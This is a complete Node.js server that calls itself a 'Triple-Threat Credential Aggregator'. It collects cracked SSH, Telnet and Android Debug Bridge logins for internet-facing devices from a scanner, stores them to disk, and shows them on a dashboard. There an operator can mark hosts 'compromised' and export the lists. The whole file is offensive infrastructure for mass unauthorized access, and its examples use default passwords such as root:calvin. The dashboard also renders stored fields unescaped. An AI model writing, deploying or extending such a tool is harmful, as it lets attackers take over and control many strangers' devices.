// ============================================================
// triple-threat-server.js  —  SSH(22) + Telnet(23) + ADB(5555-5556-5037)
//         Credential Aggregator Server v2.0  —  TRIBEAM EDITION
// ============================================================
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Store for credentials
const credentials = new Map();
let idCounter = 0;

// Statistics
const stats = {
    totalReceived: 0,
    totalUnique: 0,
    byProtocol: { SSH: 0, TELNET: 0, ADB: 0 },
    byIP: new Map(),
    startTime: Date.now()
};

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Custom middleware for raw body
app.use((req, res, next) => {
    if (req.path === '/api/register' && req.method === 'POST') {
        let data = '';
        req.on('data', chunk => data += chunk);
        req.on('end', () => {
            req.rawBody = data;
            next();
        });
    } else {
        next();
    }
});

app.use(express.static(path.join(__dirname, 'public')));

// ==============================================
// CREDENTIAL PARSING — Now with ADB support!
// ==============================================
function parseCredential(rawBody) {
    let protocol = '';
    let ip = '';
    let port = '';
    let username = '';
    let password = '';
    let banner = '';
    let line = '';

    // Clean the input
    const clean = rawBody.trim();

    // ── CASE 1: Full pipe format from scanner (NOW SUPPORTS ADB) ──
    // Format: PROTOCOL|IP|PORT|USERNAME|PASSWORD|REASON|BANNER
    // Example: SSH|192.168.1.1|22|root|calvin|auth_ok|
    // Example: ADB|192.168.1.1|5555|auto-key|N/A|direct_connect|device_banner
    const pipeMatch = clean.match(/^(SSH|TELNET|ADB)\|(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\|(\d+)\|([^|]*)\|([^|]*)(?:\|([^|]*))?(?:\|([^|]*))?$/i);
    if (pipeMatch) {
        protocol = pipeMatch[1].toUpperCase();
        ip = pipeMatch[2];
        port = pipeMatch[3];
        username = pipeMatch[4] || '';
        password = pipeMatch[5] || '';
        const reason = pipeMatch[6] || '';
        banner = pipeMatch[7] || '';
        line = clean;
        
        // For ADB, auto-key is the username, password is N/A
        if (protocol === 'ADB') {
            // Keep as-is
        }
        
        return { protocol, ip, port, username, password, banner, line };
    }

    // ── CASE 2: IP:PORT:USER:PASS (legacy format) ──
    const colonMatch = clean.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+):([^:]*):(.*)$/);
    if (colonMatch) {
        ip = colonMatch[1];
        port = colonMatch[2];
        username = colonMatch[3] || '';
        password = colonMatch[4] || '';
        // Detect protocol from port
        if (port === '22') protocol = 'SSH';
        else if (port === '23') protocol = 'TELNET';
        else if (['5555', '5556', '5037'].includes(port)) protocol = 'ADB';
        else protocol = 'UNKNOWN';
        line = clean;
        return { protocol, ip, port, username, password, banner: '', line };
    }

    // ── CASE 3: JSON format ──
    try {
        const json = JSON.parse(clean);
        if (json.protocol && json.ip && json.port && json.username !== undefined) {
            protocol = json.protocol.toUpperCase();
            ip = json.ip;
            port = String(json.port);
            username = json.username || '';
            password = json.password || '';
            banner = json.banner || '';
            line = `${protocol}|${ip}|${port}|${username}|${password}|${json.reason || ''}|${banner}`;
            return { protocol, ip, port, username, password, banner, line };
        }
        if (json.ip && json.port && json.username !== undefined) {
            ip = json.ip;
            port = String(json.port);
            username = json.username || '';
            password = json.password || '';
            banner = json.banner || '';
            if (port === '22') protocol = 'SSH';
            else if (port === '23') protocol = 'TELNET';
            else if (['5555', '5556', '5037'].includes(port)) protocol = 'ADB';
            else protocol = 'UNKNOWN';
            line = `${protocol}|${ip}|${port}|${username}|${password}|${json.reason || ''}|${banner}`;
            return { protocol, ip, port, username, password, banner, line };
        }
    } catch (e) {}

    // ── CASE 4: URL encoded ──
    try {
        const params = new URLSearchParams(clean);
        if (params.get('protocol') && params.get('ip') && params.get('port') && params.get('username') !== null) {
            protocol = params.get('protocol').toUpperCase();
            ip = params.get('ip');
            port = params.get('port');
            username = params.get('username') || '';
            password = params.get('password') || '';
            banner = params.get('banner') || '';
            line = `${protocol}|${ip}|${port}|${username}|${password}||${banner}`;
            return { protocol, ip, port, username, password, banner, line };
        }
    } catch (e) {}

    // ── CASE 5: General IP:PORT:USER:PASS pattern ──
    const generalMatch = clean.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+):([^:\s]+):(.*?)(?:\s|$)/);
    if (generalMatch) {
        ip = generalMatch[1];
        port = generalMatch[2];
        username = generalMatch[3] || '';
        password = generalMatch[4] || '';
        if (port === '22') protocol = 'SSH';
        else if (port === '23') protocol = 'TELNET';
        else if (['5555', '5556', '5037'].includes(port)) protocol = 'ADB';
        else protocol = 'UNKNOWN';
        line = `${protocol}|${ip}|${port}|${username}|${password}`;
        return { protocol, ip, port, username, password, banner: '', line };
    }

    // ── CASE 6: Just IP:PORT (partial) ──
    const ipPortMatch = clean.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)$/);
    if (ipPortMatch) {
        ip = ipPortMatch[1];
        port = ipPortMatch[2];
        return { protocol: 'UNKNOWN', ip, port, username: '', password: '', banner: '', line: clean, partial: true };
    }

    return null;
}

// ==============================================
// REGISTRATION ENDPOINT
// ==============================================
app.post('/api/register', (req, res) => {
    const rawBody = req.rawBody || '';

    if (!rawBody.trim()) {
        return res.status(400).json({ 
            error: 'Empty request',
            expected: 'PROTOCOL|IP|PORT|USER|PASS|REASON|BANNER'
        });
    }

    const parsed = parseCredential(rawBody);

    if (!parsed) {
        return res.status(400).json({ 
            error: 'Invalid format',
            expected: 'SSH|192.168.1.1|22|root|calvin or ADB|192.168.1.1|5555|auto-key|N/A|direct_connect|banner',
            received: rawBody.substring(0, 100)
        });
    }

    // Handle partial (just IP:PORT)
    if (parsed.partial) {
        const key = `${parsed.ip}:${parsed.port}`;
        return res.json({
            success: true,
            message: 'Received IP:PORT (waiting for credentials)',
            ip: parsed.ip,
            port: parsed.port,
            partial: true,
            stats: {
                total: stats.totalReceived,
                unique: stats.totalUnique
            }
        });
    }

    // Validate
    if (!parsed.ip || !parsed.port) {
        return res.status(400).json({ error: 'Missing IP or port' });
    }

    // Create unique key (include banner for ADB to differentiate)
    let key;
    if (parsed.protocol === 'ADB') {
        // For ADB, include banner in key to differentiate devices
        key = `${parsed.protocol}|${parsed.ip}|${parsed.port}|${parsed.username}|${parsed.password}|${parsed.banner || ''}`;
    } else {
        key = `${parsed.protocol}|${parsed.ip}|${parsed.port}|${parsed.username}|${parsed.password}`;
    }

    // Update stats
    stats.totalReceived++;

    // Check if exists
    let existingEntry = null;
    for (const [id, entry] of credentials) {
        if (entry.key === key) {
            existingEntry = entry;
            break;
        }
    }

    if (existingEntry) {
        existingEntry.lastSeen = new Date().toISOString();
        existingEntry.timesSeen = (existingEntry.timesSeen || 1) + 1;
        if (parsed.banner) existingEntry.banner = parsed.banner;
        
        // Update IP stats
        const ipKey = parsed.ip;
        stats.byIP.set(ipKey, (stats.byIP.get(ipKey) || 0) + 1);

        console.log(`🔄 Updated: ${key} (${existingEntry.timesSeen}x)`);
        
        return res.json({
            success: true,
            message: 'Credential updated',
            credential: {
                protocol: parsed.protocol,
                ip: parsed.ip,
                port: parsed.port,
                username: parsed.username,
                password: parsed.password,
                banner: parsed.banner || '',
                timesSeen: existingEntry.timesSeen
            }
        });
    }

    // Add new credential
    const id = ++idCounter;
    const newEntry = {
        id,
        key,
        protocol: parsed.protocol,
        ip: parsed.ip,
        port: parsed.port,
        username: parsed.username,
        password: parsed.password,
        banner: parsed.banner || '',
        line: parsed.line || key,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        timesSeen: 1,
        status: 'active' // active, tested, compromised
    };

    credentials.set(id, newEntry);
    stats.totalUnique++;

    // Update protocol stats
    if (parsed.protocol === 'SSH') stats.byProtocol.SSH++;
    else if (parsed.protocol === 'TELNET') stats.byProtocol.TELNET++;
    else if (parsed.protocol === 'ADB') stats.byProtocol.ADB++;

    // Update IP stats
    const ipKey = parsed.ip;
    stats.byIP.set(ipKey, (stats.byIP.get(ipKey) || 0) + 1);

    const bannerInfo = parsed.banner ? ` [${parsed.banner.substring(0, 50)}]` : '';
    console.log(`✅ New credential #${id}: ${parsed.protocol}|${parsed.ip}:${parsed.port}|${parsed.username}:${parsed.password}${bannerInfo}`);
    console.log(`📊 Total: ${credentials.size} credentials, ${stats.totalReceived} submissions`);

    // Auto-save to file
    saveCredentials();

    res.status(201).json({
        success: true,
        message: 'Credential registered',
        credential: newEntry,
        stats: {
            total: stats.totalReceived,
            unique: stats.totalUnique,
            ssh: stats.byProtocol.SSH,
            telnet: stats.byProtocol.TELNET,
            adb: stats.byProtocol.ADB
        }
    });
});

// ==============================================
// BULK REGISTRATION (for scanner dumps)
// ==============================================
app.post('/api/bulk', (req, res) => {
    const rawBody = req.rawBody || '';
    const lines = rawBody.split('\n').filter(l => l.trim());

    let added = 0;
    let updated = 0;
    let errors = 0;

    for (const line of lines) {
        const parsed = parseCredential(line.trim());
        if (!parsed || parsed.partial) {
            errors++;
            continue;
        }

        let key;
        if (parsed.protocol === 'ADB') {
            key = `${parsed.protocol}|${parsed.ip}|${parsed.port}|${parsed.username}|${parsed.password}|${parsed.banner || ''}`;
        } else {
            key = `${parsed.protocol}|${parsed.ip}|${parsed.port}|${parsed.username}|${parsed.password}`;
        }
        
        let exists = false;
        for (const [id, entry] of credentials) {
            if (entry.key === key) {
                exists = true;
                entry.lastSeen = new Date().toISOString();
                entry.timesSeen = (entry.timesSeen || 1) + 1;
                if (parsed.banner) entry.banner = parsed.banner;
                updated++;
                break;
            }
        }

        if (!exists) {
            const id = ++idCounter;
            const newEntry = {
                id,
                key,
                protocol: parsed.protocol,
                ip: parsed.ip,
                port: parsed.port,
                username: parsed.username,
                password: parsed.password,
                banner: parsed.banner || '',
                line: parsed.line || key,
                firstSeen: new Date().toISOString(),
                lastSeen: new Date().toISOString(),
                timesSeen: 1,
                status: 'active'
            };
            credentials.set(id, newEntry);
            stats.totalUnique++;
            stats.totalReceived++;
            if (parsed.protocol === 'SSH') stats.byProtocol.SSH++;
            else if (parsed.protocol === 'TELNET') stats.byProtocol.TELNET++;
            else if (parsed.protocol === 'ADB') stats.byProtocol.ADB++;
            added++;
        }
    }

    saveCredentials();

    console.log(`📦 Bulk import: ${added} added, ${updated} updated, ${errors} errors`);
    console.log(`📊 Total: ${credentials.size} credentials`);

    res.json({
        success: true,
        added,
        updated,
        errors,
        total: credentials.size
    });
});

// ==============================================
// GET ALL CREDENTIALS
// ==============================================
app.get('/api/credentials', (req, res) => {
    const { protocol, ip, status, limit, offset } = req.query;
    
    let results = Array.from(credentials.values());

    // Filtering
    if (protocol) {
        results = results.filter(c => c.protocol === protocol.toUpperCase());
    }
    if (ip) {
        results = results.filter(c => c.ip === ip);
    }
    if (status) {
        results = results.filter(c => c.status === status);
    }

    // Pagination
    const limitNum = parseInt(limit) || 100;
    const offsetNum = parseInt(offset) || 0;
    const total = results.length;
    const paginated = results.slice(offsetNum, offsetNum + limitNum);

    res.json({
        credentials: paginated,
        total,
        offset: offsetNum,
        limit: limitNum
    });
});

// ==============================================
// EXPORT CREDENTIALS IN SCANNER FORMAT
// ==============================================
app.get('/api/export', (req, res) => {
    const format = req.query.format || 'pipe'; // pipe, json, csv
    
    const results = Array.from(credentials.values());
    
    if (format === 'pipe') {
        const lines = results.map(c => c.line);
        res.setHeader('Content-Type', 'text/plain');
        res.setHeader('Content-Disposition', 'attachment; filename=credentials.txt');
        return res.send(lines.join('\n'));
    }
    
    if (format === 'json') {
        res.json({
            credentials: results,
            total: results.length,
            exported: new Date().toISOString()
        });
    }
    
    if (format === 'csv') {
        const headers = 'protocol,ip,port,username,password,banner,firstSeen,lastSeen,timesSeen\n';
        const lines = results.map(c => 
            `${c.protocol},${c.ip},${c.port},${c.username},${c.password},${c.banner || ''},${c.firstSeen},${c.lastSeen},${c.timesSeen}`
        );
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=credentials.csv');
        return res.send(headers + lines.join('\n'));
    }
    
    res.json({ error: 'Invalid format' });
});

// ==============================================
// LIST CREDENTIALS IN PIPE FORMAT (plain text)
// ==============================================
app.get('/list', (req, res) => {
    const results = Array.from(credentials.values());
    const lines = results.map(c => c.line);
    res.setHeader('Content-Type', 'text/plain');
    res.send(lines.join('\n'));
});

// ==============================================
// STATISTICS
// ==============================================
app.get('/api/stats', (req, res) => {
    const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    // Top IPs
    const topIPs = Array.from(stats.byIP.entries())
        .sort((a, b) => b[1] - a[1])
        .slice(0, 10)
        .map(([ip, count]) => ({ ip, count }));

    res.json({
        uptime: `${hours}h ${minutes}m`,
        totalSeconds: uptime,
        credentials: {
            total: credentials.size,
            unique: stats.totalUnique,
            received: stats.totalReceived,
            byProtocol: stats.byProtocol,
            active: Array.from(credentials.values()).filter(c => c.status === 'active').length,
            tested: Array.from(credentials.values()).filter(c => c.status === 'tested').length,
            compromised: Array.from(credentials.values()).filter(c => c.status === 'compromised').length
        },
        topIPs,
        lastUpdate: new Date().toISOString()
    });
});

// ==============================================
// UPDATE CREDENTIAL STATUS
// ==============================================
app.patch('/api/credentials/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const { status, notes } = req.body;

    if (!credentials.has(id)) {
        return res.status(404).json({ error: 'Credential not found' });
    }

    const entry = credentials.get(id);
    if (status) entry.status = status;
    if (notes) entry.notes = notes;
    entry.updatedAt = new Date().toISOString();

    saveCredentials();

    res.json({
        success: true,
        credential: entry
    });
});

// ==============================================
// DELETE CREDENTIAL
// ==============================================
app.delete('/api/credentials/:id', (req, res) => {
    const id = parseInt(req.params.id);
    if (credentials.has(id)) {
        const entry = credentials.get(id);
        credentials.delete(id);
        console.log(`🗑️ Deleted: ${entry.line}`);
        saveCredentials();
        res.json({ success: true, message: `Deleted ${entry.line}` });
    } else {
        res.status(404).json({ error: 'Credential not found' });
    }
});

// ==============================================
// CLEAR ALL
// ==============================================
app.delete('/api/credentials', (req, res) => {
    const count = credentials.size;
    credentials.clear();
    idCounter = 0;
    console.log(`🗑️ Cleared all ${count} credentials`);
    saveCredentials();
    res.json({ success: true, message: `Cleared ${count} credentials` });
});

// ==============================================
// PERSISTENCE
// ==============================================
const DATA_FILE = 'credentials.json';

function saveCredentials() {
    try {
        const data = {
            credentials: Array.from(credentials.entries()).map(([id, entry]) => [id, entry]),
            idCounter,
            stats: {
                totalReceived: stats.totalReceived,
                totalUnique: stats.totalUnique,
                byProtocol: stats.byProtocol,
                byIP: Array.from(stats.byIP.entries())
            }
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (err) {
        console.error(`❌ Failed to save: ${err.message}`);
    }
}

function loadCredentials() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            for (const [id, entry] of data.credentials) {
                credentials.set(id, entry);
                if (id > idCounter) idCounter = id;
            }
            if (data.stats) {
                stats.totalReceived = data.stats.totalReceived || 0;
                stats.totalUnique = data.stats.totalUnique || 0;
                stats.byProtocol = data.stats.byProtocol || { SSH: 0, TELNET: 0, ADB: 0 };
                if (data.stats.byIP) {
                    stats.byIP = new Map(data.stats.byIP);
                }
            }
            console.log(`📂 Loaded ${credentials.size} credentials from ${DATA_FILE}`);
        }
    } catch (err) {
        console.error(`❌ Failed to load: ${err.message}`);
    }
}

// ==============================================
// DASHBOARD — Now with ADB stats and display!
// ==============================================
app.get('/master', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>  Server</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: #00ff88; font-size: 28px; margin-bottom: 5px; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
        .subtitle { color: #888; margin-bottom: 30px; font-size: 14px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: #111927; border: 1px solid #1a2a3a; border-radius: 12px; padding: 20px; }
        .stat-card .label { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
        .stat-card .value { font-size: 32px; font-weight: bold; color: #00ff88; margin-top: 5px; }
        .stat-card .value.ssh { color: #00aaff; }
        .stat-card .value.telnet { color: #ff8800; }
        .stat-card .value.adb { color: #ff44ff; }
        .stat-card .value.compromised { color: #ff0044; }
        .table-wrap { background: #111927; border: 1px solid #1a2a3a; border-radius: 12px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #0d1620; text-align: left; padding: 12px 16px; color: #666; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
        td { padding: 10px 16px; border-top: 1px solid #1a2a3a; font-family: monospace; }
        td .status { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; text-transform: uppercase; }
        .status.active { background: #00ff8822; color: #00ff88; }
        .status.tested { background: #ffaa0022; color: #ffaa00; }
        .status.compromised { background: #ff004422; color: #ff0044; }
        .empty { text-align: center; padding: 40px; color: #444; }
        .btn { padding: 6px 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.2s; }
        .btn-danger { background: #ff004422; color: #ff0044; }
        .btn-danger:hover { background: #ff004444; }
        .btn-success { background: #00ff8822; color: #00ff88; }
        .btn-success:hover { background: #00ff8844; }
        .btn-adb { background: #ff44ff22; color: #ff44ff; }
        .btn-adb:hover { background: #ff44ff44; }
        .section-title { font-size: 18px; color: #00ff88; margin: 30px 0 15px; }
        .refresh { float: right; color: #666; cursor: pointer; font-size: 13px; }
        .refresh:hover { color: #aaa; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-right: 4px; font-weight: bold; }
        .badge-ssh { background: #00aaff22; color: #00aaff; }
        .badge-telnet { background: #ff880022; color: #ff8800; }
        .badge-adb { background: #ff44ff22; color: #ff44ff; }
        .badge-unknown { background: #666622; color: #888; }
        .banner-text { color: #666; font-size: 11px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: inline-block; }
        .highlight { color: #ff44ff; }
        @media (max-width: 600px) { .grid { grid-template-columns: 1fr 1fr; } }
        .filter-bar { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .filter-bar select, .filter-bar input { background: #111927; border: 1px solid #1a2a3a; color: #e0e0e0; padding: 6px 12px; border-radius: 6px; font-size: 12px; }
        .filter-bar select:focus, .filter-bar input:focus { outline: none; border-color: #00ff88; }
        .stats-row { display: flex; gap: 20px; flex-wrap: wrap; font-size: 13px; color: #888; margin-bottom: 10px; }
        .stats-row .count { color: #00ff88; font-weight: bold; }
    </style>
</head>
<body>
<div class="container">
    <div class="grid" id="stats">
        <div class="stat-card"><div class="label">Total Credentials</div><div class="value" id="total">0</div></div>
        <div class="stat-card"><div class="label">SSH</div><div class="value ssh" id="ssh">0</div></div>
        <div class="stat-card"><div class="label">Telnet</div><div class="value telnet" id="telnet">0</div></div>
        <div class="stat-card"><div class="label">ADB</div><div class="value adb" id="adb">0</div></div>
        <div class="stat-card"><div class="label">Compromised</div><div class="value compromised" id="compromised">0</div></div>
    </div>

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
        <div class="section-title">📋 db</div>
        <div>
            <button class="btn btn-success" onclick="exportCreds()">📤 Export</button>
            <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All</button>
            <span class="refresh" onclick="loadData()">⟳ Refresh</span>
        </div>
    </div>

    <div class="filter-bar">
        <select id="protocolFilter" onchange="applyFilter()">
            <option value="">All Protocols</option>
            <option value="SSH">SSH</option>
            <option value="TELNET">Telnet</option>
            <option value="ADB">ADB</option>
        </select>
        <input type="text" id="ipFilter" placeholder="Filter by IP..." oninput="applyFilter()" style="flex:1;min-width:150px;">
        <select id="statusFilter" onchange="applyFilter()">
            <option value="">All Status</option>
            <option value="active">Active</option>
            <option value="tested">Tested</option>
            <option value="compromised">Compromised</option>
        </select>
        <span style="color:#666;font-size:13px;display:flex;align-items:center;">
            Showing: <span id="showCount" style="color:#00ff88;font-weight:bold;margin:0 5px;">0</span> / <span id="totalCount" style="color:#00ff88;font-weight:bold;">0</span>
        </span>
    </div>

    <div class="table-wrap">
        <table>
            <thead><tr>
                <th>#</th>
                <th>Protocol</th>
                <th>IP</th>
                <th>Port</th>
                <th>Username</th>
                <th>Password</th>
                <th>Banner</th>
                <th>Seen</th>
                <th>Status</th>
                <th>Action</th>
            </tr></thead>
            <tbody id="tableBody">
                <tr><td colspan="10" class="empty">Loading...</td></tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    let allCredentials = [];

    async function loadData() {
        try {
            // Load stats
            const statsRes = await fetch('/api/stats');
            const stats = await statsRes.json();
            document.getElementById('total').textContent = stats.credentials.total;
            document.getElementById('ssh').textContent = stats.credentials.byProtocol.SSH || 0;
            document.getElementById('telnet').textContent = stats.credentials.byProtocol.TELNET || 0;
            document.getElementById('adb').textContent = stats.credentials.byProtocol.ADB || 0;
            document.getElementById('compromised').textContent = stats.credentials.compromised || 0;

            // Load credentials
            const credsRes = await fetch('/api/credentials?limit=500');
            const data = await credsRes.json();
            allCredentials = data.credentials;
            document.getElementById('totalCount').textContent = allCredentials.length;
            applyFilter();
        } catch (e) {
            console.error('Failed to load:', e);
        }
    }

    function applyFilter() {
        const protocol = document.getElementById('protocolFilter').value;
        const ip = document.getElementById('ipFilter').value.toLowerCase();
        const status = document.getElementById('statusFilter').value;

        let filtered = allCredentials;
        if (protocol) filtered = filtered.filter(c => c.protocol === protocol);
        if (ip) filtered = filtered.filter(c => c.ip.includes(ip));
        if (status) filtered = filtered.filter(c => c.status === status);

        document.getElementById('showCount').textContent = filtered.length;
        renderTable(filtered);
    }

    function renderTable(creds) {
        const tbody = document.getElementById('tableBody');
        
        if (creds.length === 0) {
            tbody.innerHTML = '<tr><td colspan="10" class="empty">No credentials match the filter</td></tr>';
            return;
        }

        tbody.innerHTML = creds.map(c => {
            const badgeClass = c.protocol === 'ADB' ? 'badge-adb' : 
                              c.protocol === 'SSH' ? 'badge-ssh' : 
                              c.protocol === 'TELNET' ? 'badge-telnet' : 'badge-unknown';
            const isADB = c.protocol === 'ADB';
            const bannerDisplay = c.banner ? \`<span class="banner-text" title="\${c.banner}">\${c.banner.substring(0, 30)}\${c.banner.length > 30 ? '...' : ''}</span>\` : '<span style="color:#444;">—</span>';
            return \`
                <tr>
                    <td>\${c.id}</td>
                    <td><span class="badge \${badgeClass}">\${c.protocol}</span></td>
                    <td>\${c.ip}</td>
                    <td>\${c.port}</td>
                    <td>\${c.username}</td>
                    <td style="color:\${isADB ? '#ff44ff' : '#ff8800'};">\${c.password}</td>
                    <td>\${bannerDisplay}</td>
                    <td style="font-size:11px;color:#666;">\${new Date(c.lastSeen).toLocaleString()}</td>
                    <td><span class="status \${c.status}">\${c.status}</span></td>
                    <td>
                        <button class="btn btn-success" onclick="updateStatus(\${c.id},'compromised')">✓</button>
                        <button class="btn btn-danger" onclick="deleteCred(\${c.id})">✕</button>
                    </td>
                </tr>
            \`;
        }).join('');
    }

    async function updateStatus(id, status) {
        try {
            await fetch(\`/api/credentials/\${id}\`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status })
            });
            loadData();
        } catch (e) { alert('Failed to update'); }
    }

    async function deleteCred(id) {
        if (!confirm('Delete this credential?')) return;
        try {
            await fetch(\`/api/credentials/\${id}\`, { method: 'DELETE' });
            loadData();
        } catch (e) { alert('Failed to delete'); }
    }

    async function clearAll() {
        if (!confirm('Delete ALL credentials?')) return;
        try {
            await fetch('/api/credentials', { method: 'DELETE' });
            loadData();
        } catch (e) { alert('Failed to clear'); }
    }

    async function exportCreds() {
        window.open('/api/export?format=pipe', '_blank');
    }

    loadData();
    setInterval(loadData, 15000); // Refresh every 15s
</script>
</body>
</html>
    `);
});

// ==============================================
// HEALTH CHECK
// ==============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        credentials: credentials.size,
        uptime: Math.floor((Date.now() - stats.startTime) / 1000),
        protocols: stats.byProtocol
    });
});

// ==============================================
// START SERVER
// ==============================================
loadCredentials();

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n╔══════════════════════════════════════════════════════╗`);
    console.log(`║     TRIPLE-THREAT CREDENTIAL SERVER v2.0            ║`);
    console.log(`║   SSH(22) + Telnet(23) + ADB(5555/5556/5037)       ║`);
    console.log(`╚══════════════════════════════════════════════════════╝\n`);
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}`);
    console.log(`📝 POST /api/register - submit credentials`);
    console.log(`📦 POST /api/bulk - bulk import`);
    console.log(`📋 GET /api/credentials - list all`);
    console.log(`📤 GET /api/export - export credentials`);
    console.log(`📄 GET /list - plain list in pipe format\n`);
    console.log(`💡 Format: SSH|192.168.1.1|22|root|calvin`);
    console.log(`💡 Format: TELNET|10.0.0.5|23|admin|password`);
    console.log(`💡 Format: ADB|192.168.1.1|5555|auto-key|N/A|direct_connect|device_banner\n`);
    console.log(`📂 Data file: ${DATA_FILE}`);
    console.log(`📊 Loaded ${credentials.size} existing credentials`);
    console.log(`   SSH: ${stats.byProtocol.SSH || 0}`);
    console.log(`   Telnet: ${stats.byProtocol.TELNET || 0}`);
    console.log(`   ADB: ${stats.byProtocol.ADB || 0}\n`);
});

// ==============================================
// GRACEFUL SHUTDOWN
// ==============================================
process.on('SIGINT', () => {
    console.log('\n\n⚠️ Saving credentials before shutdown...');
    saveCredentials();
    console.log(`✅ Saved ${credentials.size} credentials`);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n\n⚠️ Saving credentials before shutdown...');
    saveCredentials();
    console.log(`✅ Saved ${credentials.size} credentials`);
    process.exit(0);
});
